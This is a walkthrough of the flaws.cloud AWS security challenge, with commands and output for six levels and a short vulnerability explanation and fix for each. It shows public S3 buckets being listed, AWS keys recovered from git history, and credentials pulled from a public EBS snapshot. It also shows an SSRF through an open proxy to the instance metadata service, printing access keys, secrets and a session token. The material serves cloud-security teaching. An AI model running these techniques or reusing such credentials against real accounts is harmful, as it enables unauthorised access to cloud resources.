# [flaws.cloud](http://flaws.cloud): Walkthrough 

## Requirements
- A Unix-based OS.
- An AWS account, free tier will be fine
- A web browser
- And, aws-cli tool on the Unix-based OS

## Level 1
Source: http://flaws.cloud

**Objective:** This level is *buckets* of fun. See if you can find the first sub-domain.

**Steps:** 
1. The word *buckets* indicates that S3 buckets are being used somewhere. As S3 buckets can host static webpages, it is possible that this site is hosted on an S3 bucket.
Grab the IP of the static website and perform a reverse lookup on it using *nslookup*.
    ```
    $ nslookup flaws.cloud
    Server:		127.0.0.53
    Address:	127.0.0.53#53
    Non-authoritative answer:
    Name:	flaws.cloud
    Address: 52.92.195.187
    
    $ nslookup 52.92.195.187
    187.195.92.52.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
    ```
2. The results confirms that it's an S3 static website running in the us-west-2 region.
We can even directly visit the below S3 bucket. It will list all the files due to the loose permissions.
http://flaws.cloud.s3.amazonaws.com
4. There is an interesting file called *secret-dd02c7c.html*, we can try to access. On accessing, it solves this challenge and gives the address to the next one.
http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html

**Vulnerability:** The bucket access policy was configured in such a was that "Everyone" was allowed to list the contents of the bucket. Due to which, lterally anyone on the Internet can list the files.

**Solution:** While hosting static website on S3 buckets, we should avoid changing the default setting to grant unnecessary permissions like the list permission to everyone in this case.

## Level 2
Source: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/

**Objective:** The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this.

**Steps:**
With the given objection in hand, it is obvious that this is pretty much similar to the last one. Let's assume that this time, the permission will be granted to "Any Authenticated AWS User" instead of "Everyone".
1. Configure AWS CLI with the Access Key and Secret Key of the IAM user.
    ```
    $ aws configure
    AWS Access Key ID [None]: ********************
    AWS Secret Access Key [None]: ********************
    Default region name [us-west-2]: us-west-2
    Default output format [json]: json
    ```
2. Then, attempt to browse the bucket using the AWS CLI.
    ```
    $ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
    2017-02-27 07:32:15      80751 everyone.png
    2017-03-03 09:17:17       1433 hint1.html
    2017-02-27 07:34:39       1035 hint2.html
    2017-02-27 07:32:14       2786 index.html
    2017-02-27 07:32:14         26 robots.txt
    2017-02-27 07:32:15       1051 secret-e4443fc.html
    ```
3. There is an interesting file called secret-e4443fc.html. On accessing this files, it solves this challenge and gives the address to the next one.
http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com/secret-e4443fc.html

**Vulnerability:** This time, the bucket access policy was configured in such a was that "Any Authenticated AWS User" was allowed to list the contents of the bucket. Which means anyone with an AWS account can list the files.

**Solution:** We should avoid changing the default setting to grant unnecessary permissions, even to "Any Authenticated AWS User".

## Level 3
Source: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

**Objective:** The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.

**Steps:**
Again, the objective suggests that it is related to S3 and this time, we have to find AWS secrect and access keys in it.
1. Being with browsing this bucket via the AWS CLI.
    ```
    $ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
                               PRE .git/
    2017-02-27 05:44:33     123637 authenticated_users.png
    2017-02-27 05:44:34       1552 hint1.html
    2017-02-27 05:44:34       1426 hint2.html
    2017-02-27 05:44:35       1247 hint3.html
    2017-02-27 05:44:33       1035 hint4.html
    2020-05-22 23:51:10       1861 index.html
    2017-02-27 05:44:33         26 robots.txt
    ```
2. There is a *.git* directory which means this S3 bucket is being tracked in a git repository.
Let's just recursively copy this S3 directory locally in a directory called level3 to deal with it more cosely.
    ```
    $ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./level3
    download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to level3/.git/COMMIT_EDITMSG
    ...
    ```
3. Then, move to the level3 directory and view the git logs.
    ```
    $ cd level3
    
    $ git log
    commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
    Author: 0xdabbad00 <scott@summitroute.com>
    Date:   Sun Sep 17 09:10:43 2017 -0600
    
        Oops, accidentally added something I shouldn't have
    
    commit f52ec03b227ea6094b04e43f475fb0126edb5a61
    Author: 0xdabbad00 <scott@summitroute.com>
    Date:   Sun Sep 17 09:10:07 2017 -0600
    
        first commit
    ```
4. It seems that they have accidently commited something secrect, which obviously will be the AWS access and the secret keys.
Let's see the difference between these two commits and try to find something.
    ```
    $ git diff b64c8d f52ec0
    diff --git a/access_keys.txt b/access_keys.txt
    new file mode 100644
    index 0000000..e3ae6dd
    --- /dev/null
    +++ b/access_keys.txt
    @@ -0,0 +1,2 @@
    +access_key AKIAJ366LIPB4IJKT7SA
    +secret_access_key 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
    ```
5. Here we go, we got the AWS keys which were accidently commited then were removed in the next commit.
Creating a new profile using the AWS CLI's configure utility and the AWS keys called *level3*.
    ```
    $ aws configure --profile flaws
    AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
    AWS Secret Access Key [None]: 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
    Default region name [None]: us-west-2
    Default output format [None]: json
    ```
6. Then, we used that profile for listing the contents of the bucket and we got the address to the next level.
    ```
    $ aws s3 ls --profile flaws
    2020-06-25 23:13:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
    2020-06-27 04:36:07 config-bucket-975426262029
    2020-06-27 16:16:15 flaws-logs
    2020-06-27 16:16:15 flaws.cloud
    2020-06-27 20:57:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
    2020-06-27 20:57:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
    2020-06-27 20:57:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
    2020-06-27 20:57:15
    ...
    ```

**Vulnerability:** AWS access and secret keys were nore rolled after being commited on GitHub.

**Solution:** Frequently roll the secret keys, especially if it has been suspected they have been leaked somewhere.

## Level 4
Source: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud

**Objective:** For the next level, you need to get access to the web page running on an EC2 at **4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud**
It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. 

**Steps:**
The objective talks about a snapshot of an EC2 instance on which a static web page is running that we have to access but it requires authentication. We have to find this snapshot, get it attached to our created EC2 instance, and then mount the volume associated with this EC2 instance on our created instance. Then we might find the authentication credentials on this mounted volume.
1. To list the EBS snapshot, we need the ownerID of the profile we created with the discovered keys.
    ```
    $ aws sts get-caller-identity --profile flaws
    {
        "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
        "Account": "975426262029",
        "Arn": "arn:aws:iam::975426262029:user/backup"
    }
    ```
2. For creating the volume, we need the region in which this bucket is hosted.
    ```
    $ host 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
    4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud has address 35.165.182.7
    4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud is an alias for ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
    ```
2. Now, we can list the EBS snapshot associated with this ownerID and the profile (it will limit down our search results).
    ```
    $ aws ec2 describe-snapshots --owner-ids 975426262029 --profile flaws
    {
        "Snapshots": [
            {
                "Description": "",
                "Encrypted": false,
                "OwnerId": "975426262029",
                "Progress": "100%",
                "SnapshotId": "snap-0b49342abd1bdcb89",
                "StartTime": "2017-02-28T01:35:12.000Z",
                "State": "completed",
                "VolumeId": "vol-04f1c039bc13ea950",
                "VolumeSize": 8,
                "Tags": [
                    {
                        "Key": "Name",
                        "Value": "flaws backup 2017.02.27"
                    }
                ],
                "StorageTier": "standard"
            }
        ]
    }
    ```
3. Then, we'll create a new volume from this snapshot using the snapshotID we got from the output of the last command, the region will be the one we found earlier, and the profile will be ours.
    ```
    $ aws ec2 create-volume --profile ratnakar --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89
    {
        "AvailabilityZone": "us-west-2a",
        "CreateTime": "2022-12-10T14:48:03.000Z",
        "Encrypted": false,
        "Size": 8,
        "SnapshotId": "snap-0b49342abd1bdcb89",
        "State": "creating",
        "VolumeId": "vol-095b0d855aa488f51",
        "Iops": 100,
        "Tags": [],
        "VolumeType": "gp2",
        "MultiAttachEnabled": false
    }
    ```
4. Now, we will create an EC2 instance and attach this volume to it.
    - Login to AWS web console, and go to the EC2 Dashboard which is accessible at the given URL.
    https://us-west-2.console.aws.amazon.com/ec2/home
    - Click on the orange "Launch instance" button to open the dropdown menu and select "Launch instance".
    
    ![](./images/4.1.jpg)
    
    - On the new page, given a name to the instance, let's say "myInstance" and scroll down.
    
    ![](./images/4.2.jpg)
    
    - Then, select "Amazon Linux 2" as the OS image and scroll down.
    
    ![](./images/4.3.jpg)
    
    - Select a key pair or, just continue to without it if you wish to proceed insecurely and scroll down.
    
    ![](./images/4.4.jpg)
    
    - Select the "Advanced" option under the "Configure storage" to expand it and click on the "Add new volume" button.
    
    ![](./images/4.5.jpg)
    
    - In the Snapshot field of the newly added volume section, add the snapshotID obtained from the output of the last command.
    
    ![](./images/4.6.jpg)
    
    - Scroll down, leave rest everything as default and click on the "Launch instance" button then, connect the instance.
    
    ![](./images/4.7.jpg)
    
5. After gaining a shell on the new EC2 instance, we need to mount the attached volume locally so first, we'll list the attached volumes.
    ```
    $ lsblk
    NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
    xvda    202:0    0   8G  0 disk 
    └─xvda1 202:1    0   8G  0 part /
    xvdb    202:16   0   8G  0 disk 
    └─xvdb1 202:17   0   8G  0 part 
    ```
6. Then, we need to check which of these volumes is already attached.
    ```
    $ df -h
    Filesystem      Size  Used Avail Use% Mounted on
    ...
    /dev/xvda1      8.0G  1.6G  6.5G  20% /
    ...
    ```
7. As the output shows, xvda1 is already attached as the root filesystem. So, we'll mount the second one that is xvda1 then, try to find the credentials in it.
    ```
    $ sudo mount /dev/xvdb1 /mnt
    
    $ cd /mnt
    $ ls
    bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
    boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
    
    $ cd home
    
    $ ls
    ubuntu
    
    $ cd ubuntu
    
    $ ls
    meta-data  setupNginx.sh
    
    $ cat setupNginx.sh
    htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
    ```
8. Finally, we found the authentication credentials in the Nginx script.
`flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`
9. Then, we'll get authenticated to the website running on the EC2 instance using these credentials which also will give address to the next challenge.

**Vulnerability:** An EBS volume snapshot with sensitive credentials was made public.

**Solution:** EBS volume snapshots containing sensitive information such as keys, credentials etc, should never be made public for any means such as sharing. If they has to be shared, then it must be done by specifically sharing the snapshot with that account.

## Level 5
Source: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c

**Objective:** This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ 
See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it. 

**Steps:**
The objective states that the given EC2 has an HTTP only proxy which have use in order to list the contents of the level6 bucket what has a hidden directory.
1. It is worth noticing that if we add any domain after the /proxy/ in the given examples and browse it, it will be redirected to that domain.
    ```
    $ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/google.com/
    <HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
    <TITLE>301 Moved</TITLE></HEAD><BODY>
    <H1>301 Moved</H1>
    The document has moved
    <A HREF="http://www.google.com/">here</A>.
    </BODY></HTML>
    ```
2. Lets try to leverage this proxy to access the metadata service that runs at `http://169.254.169.254/latest/meta-data`
    ```
    $ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data
    ami-id
    ami-launch-index
    ami-manifest-path
    block-device-mapping/
    events/
    hostname
    iam/
    identity-credentials/
    instance-action
    instance-id
    instance-life-cycle
    instance-type
    local-hostname
    local-ipv4
    mac
    metrics/
    network/
    placement/
    profile
    public-hostname
    public-ipv4
    public-keys/
    reservation-id
    security-groups
    services/
    system
    ```
3. We are able to access the AWS meta-data by abusing this proxy to access the meta-data service. So, we can also try to fetch the secret keys.
    ```
    $ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials
    flaws
    
    curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
    {
      "Code" : "Success",
      "LastUpdated" : "2022-12-11T12:27:39Z",
      "Type" : "AWS-HMAC",
      "AccessKeyId" : "ASIA6GG7PSQG7GNEPKOW",
      "SecretAccessKey" : "ml3G5fv/6DgKOi/nTD+93bNwbWTGS5w3C/6kif+D",
      "Token" : "IQoJb3JpZ2luX2VjEGUaCXVzLXdlc3QtMiJHMEUCIQD3GXsNcGOIgDx3M4Vtp8TnWj9aJ+0SY36LEEo0Lb+JPAIgbRWVQT+erHY3UROQIh1Gfdb5NABINRamLgFPE4s1Zfkq1QQIjv//////////ARADGgw5NzU0MjYyNjIwMjkiDKiLr7KAAAo+P1MwOSqpBMdUkbLPmia7B66WgXHQn6D3k5P2OVYHmJEOAo9tRyev45ar5s0isAo/Z4reHMS7JfnPXyx7+TyJerhVgPMFuIyqCloL8KPMF75fDSOEImz6bRlLxs/7P1PQmAOvmzlqVe+OvN6ODC6PG8GmGMHbWqQTuFnirukxd1NeE6j+groihk1IuzvycaHdTXjF9GQAnUe2fzLQydOBC7U2ey3LDnoTujZLzSt4G1qyoPJAdG1RiH3R9+BwRfBOXaiHJeEnR3WCKxHfXXYR/A/wOwp11V2oV0KQPPeYDjH00em264C7MTR22NMUunIDBvIH4Lk1PgYBCOKFGEchDfOTSFSh5B6rh/SWqrOrBV0AdM1g0T8MbVf/vb71CAo/EFBwy74xOpErluEdMjWDi2u7mANhwvzjJhZKp/KtvXHyf80+XVhONCzi1+YSF/dsYzlh6GC9tcfnG4B9KlRSAKQWmABqnddqqpGz/0QGAkkJ+KTwOnMl+NAJX6X/RJG36U4ppJ5WSDRKaCx6YTEtNWSUNPgE2YuQY/HEzyIhUPg3qzDvLIs08+DHw7J/hOFd+RZVo+my+1BmnJTnbfkOhFC/pZw5UYU2fOJGd0zeqfDK7h5jhrbfKC8QnaJ+BwNMA5sBXCexiwJnyLG92wTvGe+cfL1ot0aJ34Ph3lZ3piXuSxeyWwJGGIswx7V+PV86yJwvrfcwiKhe8UFN8a3rbuUIxcjtJix/2T/CW71Oz10wh5nXnAY6qQFfsmy7zbE8fR31Fupzjqu3ezb3FDjYOLqklmE2pFdhQbbRWpeMm4agoU69+O+e1W8ThbOgwFDUuVUvVdgHAgTR9tghaIc7VvUkybUOINOar73BBRAbxh8uh4D+XnPwz2zBKme42CIOQmoHs//OKMvb5/CFjgf/016UWw4ka1m8gg0/6/3bQjkrZ2ZedtuhUXgzPA7oF44qRGfFu9H9KZ3ac5VkjQZfxNeg",
      "Expiration" : "2022-12-11T18:40:02Z"
    }
    ```
4. After gaining the AccessKeyId, SecretAccessKey, and Token, we must complete the further steps before this token expires. We then need to configure a new profile using these values.
    ```
    $ cat ~/.aws/credentials
    [level5]
    aws_access_key_id = ASIA6GG7PSQG7GNEPKOW
    aws_secret_access_key = ml3G5fv/6DgKOi/nTD+93bNwbWTGS5w3C/6kif+D
    aws_session_token = IQoJb3JpZ2luX2VjEGUaCXVzLXdlc3QtMiJHMEUCIQD3GXsNcGOIgDx3M4Vtp8TnWj9aJ+0SY36LEEo0Lb+JPAIgbRWVQT+erHY3UROQIh1Gfdb5NABINRamLgFPE4s1Zfkq1QQIjv//////////ARADGgw5NzU0MjYyNjIwMjkiDKiLr7KAAAo+P1MwOSqpBMdUkbLPmia7B66WgXHQn6D3k5P2OVYHmJEOAo9tRyev45ar5s0isAo/Z4reHMS7JfnPXyx7+TyJerhVgPMFuIyqCloL8KPMF75fDSOEImz6bRlLxs/7P1PQmAOvmzlqVe+OvN6ODC6PG8GmGMHbWqQTuFnirukxd1NeE6j+groihk1IuzvycaHdTXjF9GQAnUe2fzLQydOBC7U2ey3LDnoTujZLzSt4G1qyoPJAdG1RiH3R9+BwRfBOXaiHJeEnR3WCKxHfXXYR/A/wOwp11V2oV0KQPPeYDjH00em264C7MTR22NMUunIDBvIH4Lk1PgYBCOKFGEchDfOTSFSh5B6rh/SWqrOrBV0AdM1g0T8MbVf/vb71CAo/EFBwy74xOpErluEdMjWDi2u7mANhwvzjJhZKp/KtvXHyf80+XVhONCzi1+YSF/dsYzlh6GC9tcfnG4B9KlRSAKQWmABqnddqqpGz/0QGAkkJ+KTwOnMl+NAJX6X/RJG36U4ppJ5WSDRKaCx6YTEtNWSUNPgE2YuQY/HEzyIhUPg3qzDvLIs08+DHw7J/hOFd+RZVo+my+1BmnJTnbfkOhFC/pZw5UYU2fOJGd0zeqfDK7h5jhrbfKC8QnaJ+BwNMA5sBXCexiwJnyLG92wTvGe+cfL1ot0aJ34Ph3lZ3piXuSxeyWwJGGIswx7V+PV86yJwvrfcwiKhe8UFN8a3rbuUIxcjtJix/2T/CW71Oz10wh5nXnAY6qQFfsmy7zbE8fR31Fupzjqu3ezb3FDjYOLqklmE2pFdhQbbRWpeMm4agoU69+O+e1W8ThbOgwFDUuVUvVdgHAgTR9tghaIc7VvUkybUOINOar73BBRAbxh8uh4D+XnPwz2zBKme42CIOQmoHs//OKMvb5/CFjgf/016UWw4ka1m8gg0/6/3bQjkrZ2ZedtuhUXgzPA7oF44qRGfFu9H9KZ3ac5VkjQZfxNeg
    ```
5. Then, we can try to list the contents of this bucket using the newly created profile *level5*.
    ```
    $ aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile level5
                               PRE ddcc78ff/
    2017-02-27 07:41:07        871 index.html
    ```
6. Now, as we know the PRE sub-directory is *ddcc78ff/*, we can access the same at http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff

**Vulnerability:** EC2 IMDSv1 was being used which is less secure as it allows reaching the metadata endpoint located at `http://169.254.169.254` with a simple GET request within the instance resulting in SSRF.

**Solution:** We must ensure that our applications restrict access to 169.254.169.254 or any other local/private and private IPs. 

**Recommendation:**
- Enfore the usage of IMDSv2 and avoid IMDSv1 because IMDSv2 uses a session-oriented method which is least susceptible to SSRF.
- Follow the The principle of least privilege for IAM roles to enforce resctrictions.

## Level 6
Source: http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/index.html

**Objective:** 
For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.
`Access key ID: AKIAJFQ6E7BY57Q3OBGA`
`Secret: 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`

**Steps:**
The objective states that there is a SecurityAudit policy attached to the given user access key.
1. First let's create a profile with the given AWS keys.
    ```
    $ aws configure --profile level6
    AWS Access Key ID [None]: AKIAJFQ6E7BY57Q3OBGA
    AWS Secret Access Key [None]: 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
    Default region name [None]: us-west-2
    Default output format [None]: json
    ```
2.  Then, get the IAM information associated with this profile to know which policies are attached with that user.
    ```
    $ aws iam get-user --profile level6
    {
        "User": {
            "Path": "/",
            "UserName": "Level6",
            "UserId": "AIDAIRMDOSCWGLCDWOG6A",
            "Arn": "arn:aws:iam::975426262029:user/Level6",
            "CreateDate": "2017-02-26T23:11:16Z"
        }
    }
    ```
3. There is a user called *Level6* so, we're going to find which policies are there for this user.
    ```
    $ aws iam list-attached-user-policies --user-name Level6 --profile level6
    {
        "AttachedPolicies": [
            {
                "PolicyName": "MySecurityAudit",
                "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
            },
            {
                "PolicyName": "list_apigateways",
                "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
            }
        ]
    }
    ```
4. As shown in the output, there are two attached policies but as our goal is to find an address for the next level, "list_apigateways" could be the one we're looking for. So, we'll get the details of this policy using it's PolicyArn.
    ```
    $ aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6
    {
        "Policy": {
            "PolicyName": "list_apigateways",
            "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
            "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
            "Path": "/",
            "DefaultVersionId": "v4",
            "AttachmentCount": 1,
            "PermissionsBoundaryUsageCount": 0,
            "IsAttachable": true,
            "Description": "List apigateways",
            "CreateDate": "2017-02-20T01:45:17Z",
            "UpdateDate": "2017-02-20T01:48:17Z",
            "Tags": []
        }
    }
    ```
5. Now, we need to be a bit specific and get the details of the policy with version v4.
    ```
    $ aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6
    {
        "PolicyVersion": {
            "Document": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Action": [
                            "apigateway:GET"
                        ],
                        "Effect": "Allow",
                        "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                    }
                ]
            },
            "VersionId": "v4",
            "IsDefaultVersion": true,
            "CreateDate": "2017-02-20T01:48:17Z"
        }
    }
    ```
6. The output suggests that the target resource is an API. We know that the most common target for an API gateway is a Lambda function, so out next task it to figure out what all lamda functions are there.
    ```
    $ aws lambda list-functions --profile level6
    {
        "Functions": [
            {
                "FunctionName": "Level6",
                "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
                "Runtime": "python2.7",
                "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
                "Handler": "lambda_function.lambda_handler",
                "CodeSize": 282,
                "Description": "A starter AWS Lambda function.",
                "Timeout": 3,
                "MemorySize": 128,
                "LastModified": "2017-02-27T00:24:36.054+0000",
                "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
                "Version": "$LATEST",
                "TracingConfig": {
                    "Mode": "PassThrough"
                },
                "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",
                "PackageType": "Zip",
                "Architectures": [
                    "x86_64"
                ]
            }
        ]
    }
    ```
7. There is one function attached with this user called "Level6". Now, we have to find the details of this function.
    ```
    $ aws lambda get-policy --function-name Level6 --profile level6
    {
        "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
        "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
    }
    ```
8. This policy indicates that there is an Action "lambda:InvokeFunction", whose Resource is "arn:aws:lambda:us-west-2:975426262029:function:Level6" and the Condition is "arn:aws:execute-api:us-...". So, it will execute an API with apiId s33ppypa75. So now, we need to find the API gateway where we're going to this.
    ```
    $ aws apigateway get-stages --rest-api-id s33ppypa75 --profile level6
    {
        "item": [
            {
                "deploymentId": "8gppiv",
                "stageName": "Prod",
                "cacheClusterEnabled": false,
                "cacheClusterStatus": "NOT_AVAILABLE",
                "methodSettings": {},
                "tracingEnabled": false,
                "createdDate": 1488155168,
                "lastUpdatedDate": 1488155168
            }
        ]
    }
    ```
9. So far, we got the FunctionName, api ID, and the stageName and now, we have to figure out what will be the proper URL format to execute this API.
After a bit of Google search, we found the format, 
`https://{restapi_id}.execute-api.{region}.amazonaws.com/{stage_name}/`
Where, {restapi_id} is the API identifier, {region} is the Region, and {stage_name} is the stage name of the API deployment.
![](./images/6.1.jpg)
10. Now, we'll contruct a rest API in this format and append /level6 to it as show in the lambda funtion details.
After making this API call, we'll get the address to the end of this challenge.
`https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6`
    ```
    $ curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
    "Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
    ```

**Vulnerability:** Unnecessary permissions result in information disclosure.

**Solution:** Avoind grating permissions generously, even those which only let someone read the meta-data or reveal permissions.

**Recommendation:**
- Follow the The principle of least privilege for IAM roles to enforce resctrictions.
